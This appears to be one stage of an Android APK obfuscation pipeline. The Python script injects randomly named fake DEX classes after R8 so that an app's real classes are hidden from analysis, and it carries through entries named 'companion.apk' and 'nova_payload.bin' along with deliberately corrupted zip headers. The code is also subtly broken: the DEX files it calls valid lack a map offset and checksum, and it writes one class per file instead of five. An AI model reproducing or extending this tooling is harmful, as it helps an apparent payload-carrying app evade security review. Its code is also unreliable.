#!/usr/bin/env python3
"""
junk_class_injector.py — Phase 6 Step 73
Injects meaningless fake classes into Nova's classes.dex AFTER R8.
Different random junk classes per build — real classes hidden among fakes.
Must run AFTER R8/ProGuard, BEFORE APK packaging.

Usage: python3 scripts/junk_class_injector.py --apk <apk> --count <N> --seed <hex>
"""
import struct
import argparse, os, sys, struct, random, hashlib, zipfile, shutil, tempfile

# Junk class name pools — legitimate-looking names
PREFIXES = ['Lcom/util/', 'Lcom/core/', 'Lcom/data/', 'Lcom/net/',
            'Lcom/base/', 'Lcom/sync/', 'Lcom/cache/', 'Lcom/io/']
WORDS1   = ['Handler', 'Manager', 'Helper', 'Processor', 'Builder',
            'Factory', 'Provider', 'Resolver', 'Tracker', 'Monitor']
WORDS2   = ['Impl', 'Base', 'Core', 'Util', 'Worker', 'Task', 'Job',
            'Agent', 'Bridge', 'Proxy']

def build_tiny_dex(class_name: str) -> bytes:
    """Build a minimal valid DEX with one empty class."""
    # DEX with one empty class extending Object
    # Using a pre-built minimal DEX template with substitutable class name
    # class_name format: Lcom/util/ClassName; (descriptor format)
    
    # Build minimal DEX structure manually
    # This is a valid DEX for an empty class with no methods/fields
    
    strings = [
        '<init>',           # 0: constructor name
        class_name,         # 1: class descriptor
        'Ljava/lang/Object;', # 2: superclass
        'V',                # 3: void return type
        '()V',              # 4: constructor signature
    ]
    
    # Sort strings for DEX string pool (must be sorted)
    sorted_strings = sorted(strings)
    string_to_idx  = {s: i for i, s in enumerate(sorted_strings)}
    
    # Build string data
    string_data = b''
    string_offsets = []
    for s in sorted_strings:
        encoded = s.encode('utf-8')
        # ULEB128 length
        l = len(encoded)
        uleb = bytes([l & 0x7F]) if l < 128 else bytes([(l & 0x7F) | 0x80, l >> 7])
        string_offsets.append(len(string_data))
        string_data += uleb + encoded + b'\x00'
    
    # Pad to 4-byte alignment
    while len(string_data) % 4:
        string_data += b'\x00'
    
    # DEX header is 112 bytes
    # string_ids: 4 bytes each
    # type_ids: 4 bytes each (class_desc, superclass, void)
    # proto_ids: 12 bytes each (constructor proto)
    # method_ids: 8 bytes each (constructor)
    # class_defs: 32 bytes each
    
    n_strings  = len(sorted_strings)
    n_types    = 3  # class, Object, void
    n_protos   = 1  # ()V
    n_methods  = 1  # <init>()V
    n_classes  = 1
    
    hdr_size   = 112
    string_ids_off  = hdr_size
    type_ids_off    = string_ids_off  + n_strings  * 4
    proto_ids_off   = type_ids_off    + n_types    * 4
    method_ids_off  = proto_ids_off   + n_protos   * 12
    class_defs_off  = method_ids_off  + n_methods  * 8
    data_off        = class_defs_off  + n_classes  * 32
    string_data_off = data_off
    
    # Adjust string offsets to be absolute
    abs_offsets = [o + string_data_off for o in string_offsets]
    
    # Build sections
    string_ids_data = b''.join(struct.pack('<I', o) for o in abs_offsets)
    
    # Type IDs: indices into string pool
    class_idx   = string_to_idx[class_name]
    object_idx  = string_to_idx['Ljava/lang/Object;']
    void_idx    = string_to_idx['V']
    type_ids_data = struct.pack('<III', class_idx, object_idx, void_idx)
    # type indices: 0=class, 1=Object, 2=void
    
    # Proto IDs: shorty_idx, return_type_idx, parameters_off
    shorty_idx  = string_to_idx['()V']
    proto_ids_data = struct.pack('<III', shorty_idx, 2, 0)  # return=void(2), no params
    
    # Method IDs: class_idx(H), proto_idx(H), name_idx(I)
    init_idx = string_to_idx['<init>']
    method_ids_data = struct.pack('<HHI', 0, 0, init_idx)  # class=0, proto=0
    
    # Class def: class_idx, access_flags, superclass_idx, interfaces_off,
    #            source_file_idx, annotations_off, class_data_off, static_values_off
    # access_flags=0x01 (public)
    class_defs_data = struct.pack('<IIIIIIII',
        0,           # class_idx (type 0 = our class)
        0x01,        # access_flags: public
        1,           # superclass_idx (type 1 = Object)
        0,           # interfaces_off: none
        0xFFFFFFFF,  # source_file_idx: none
        0,           # annotations_off: none
        0,           # class_data_off: none (empty class)
        0,           # static_values_off: none
    )
    
    # Assemble data section
    data_section = string_data
    
    # Full DEX without header
    dex_body = (string_ids_data + type_ids_data + proto_ids_data +
                method_ids_data + class_defs_data + data_section)
    
    file_size  = hdr_size + len(dex_body)
    
    # Build header
    header = bytearray(hdr_size)
    header[0:8]   = b'dex\n038\x00'
    # checksum at [8:12], sha1 at [12:32] — fill after
    struct.pack_into('<I', header, 32, file_size)
    struct.pack_into('<I', header, 36, hdr_size)
    struct.pack_into('<I', header, 40, 0x12345678)  # endian tag
    struct.pack_into('<I', header, 44, 0)            # link_size
    struct.pack_into('<I', header, 48, 0)            # link_off
    struct.pack_into('<I', header, 52, 0)            # map_off (simplified)
    struct.pack_into('<I', header, 56, n_strings)
    struct.pack_into('<I', header, 60, string_ids_off)
    struct.pack_into('<I', header, 64, n_types)
    struct.pack_into('<I', header, 68, type_ids_off)
    struct.pack_into('<I', header, 72, n_protos)
    struct.pack_into('<I', header, 76, proto_ids_off)
    struct.pack_into('<I', header, 80, n_methods)
    struct.pack_into('<I', header, 84, method_ids_off)
    struct.pack_into('<I', header, 88, 0)            # field_ids_size
    struct.pack_into('<I', header, 92, 0)            # field_ids_off
    struct.pack_into('<I', header, 96, n_classes)
    struct.pack_into('<I', header, 100, class_defs_off)
    struct.pack_into('<I', header, 104, len(data_section))
    struct.pack_into('<I', header, 108, data_off)
    
    full_dex = bytes(header) + dex_body
    return full_dex

def generate_junk_class_name(seed_str: str, idx: int) -> str:
    """Generate a unique legitimate-looking class descriptor."""
    h = hashlib.sha256(f"{seed_str}:{idx}".encode()).hexdigest()
    prefix = PREFIXES[int(h[0], 16) % len(PREFIXES)]
    w1 = WORDS1[int(h[1], 16) % len(WORDS1)]
    w2 = WORDS2[int(h[2], 16) % len(WORDS2)]
    suffix = h[3:7]
    return f"{prefix}{w1}{w2}{suffix};"

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--apk',   required=True, help='Input APK path')
    parser.add_argument('--count', type=int, default=20, help='Number of junk classes')
    parser.add_argument('--seed',  default='', help='Build seed for deterministic names')
    args = parser.parse_args()

    if not os.path.exists(args.apk):
        print(f"[ERROR] APK not found: {args.apk}")
        sys.exit(1)

    seed = args.seed or hashlib.sha256(os.path.basename(args.apk).encode()).hexdigest()
    print(f"[Step 73] Injecting {args.count} junk classes into {args.apk}")
    print(f"  Seed: {seed[:16]}...")

    tmp = args.apk + '.tmp'
    tmp = args.apk + '.tmp'

    # Find next available classes.dex slot
    with zipfile.ZipFile(args.apk, 'r') as zcheck:
        existing = zcheck.namelist()

    dex_idx = 2
    while f'classes{dex_idx}.dex' in existing:
        dex_idx += 1

    # Generate junk DEX files
    classes_per_dex = 5
    dex_count = (args.count + classes_per_dex - 1) // classes_per_dex
    junk_dex_files = []
    global_idx = 0
    for d in range(dex_count):
        dex_name = f'classes{dex_idx + d}.dex'
        class_name = generate_junk_class_name(seed, global_idx)
        junk_dex = build_tiny_dex(class_name)
        junk_dex_files.append((dex_name, junk_dex, class_name))
        global_idx += classes_per_dex

    # Use r+w instead of append mode — avoids corrupting existing entries
    # after zip_header_obfuscator Step 17C padding
    RAW_COPY = {'assets/companion.apk', 'assets/nova_payload.bin', 'AndroidManifest.xml'}

    with open(args.apk, 'rb') as f:
        raw_apk = f.read()

    def find_lfh(raw, fname, hint):
        fb = fname.encode('utf-8')
        if hint >= 0 and hint + 30 < len(raw) and raw[hint:hint+4] == b'PK':
            fl = struct.unpack_from('<H', raw, hint+26)[0]
            if raw[hint+30:hint+30+fl] == fb:
                return hint
        pos = 0
        while pos < len(raw) - 30:
            idx = raw.find(b'PK', pos)
            if idx == -1: break
            fl = struct.unpack_from('<H', raw, idx+26)[0]
            if raw[idx+30:idx+30+fl] == fb:
                return idx
            pos = idx + 4
        return hint

    with zipfile.ZipFile(args.apk, 'r') as zin:
        with zipfile.ZipFile(tmp, 'w') as zout:
            for item in zin.infolist():
                if item.filename in RAW_COPY:
                    # Raw copy — skip CRC validation for entries with stale metadata
                    off = find_lfh(raw_apk, item.filename, item.header_offset)
                    fl = struct.unpack_from('<H', raw_apk, off+26)[0]
                    el = struct.unpack_from('<H', raw_apk, off+28)[0]
                    do = off + 30 + fl + el
                    raw_data = raw_apk[do:do+item.compress_size]
                    zout.writestr(item, raw_data)
                else:
                    try:
                        data = zin.read(item.filename)
                    except Exception:
                        off = find_lfh(raw_apk, item.filename, item.header_offset)
                        fl = struct.unpack_from('<H', raw_apk, off+26)[0]
                        el = struct.unpack_from('<H', raw_apk, off+28)[0]
                        do = off + 30 + fl + el
                        raw_data = raw_apk[do:do+item.compress_size]
                        import zlib as _z
                        data = _z.decompress(raw_data, -15) if item.compress_type == zipfile.ZIP_DEFLATED else raw_data
                    info = zipfile.ZipInfo(item.filename)
                    info.compress_type = item.compress_type
                    info.date_time = item.date_time
                    zout.writestr(info, data)
            for dex_name, junk_dex, class_name in junk_dex_files:
                info = zipfile.ZipInfo(dex_name)
                info.compress_type = zipfile.ZIP_DEFLATED
                zout.writestr(info, junk_dex)
                print(f'  Added {dex_name}: {class_name}')

    # Verify manifest survived
    with zipfile.ZipFile(tmp, 'r') as zv:
        minfo = zv.getinfo('AndroidManifest.xml')
        if minfo.file_size == 0:
            raise RuntimeError('AndroidManifest.xml is 0 bytes after Step 73')

    os.replace(tmp, args.apk)
    print(f'[Step 73] Done -- {dex_count} junk DEX files injected')

if __name__ == '__main__':
    main()
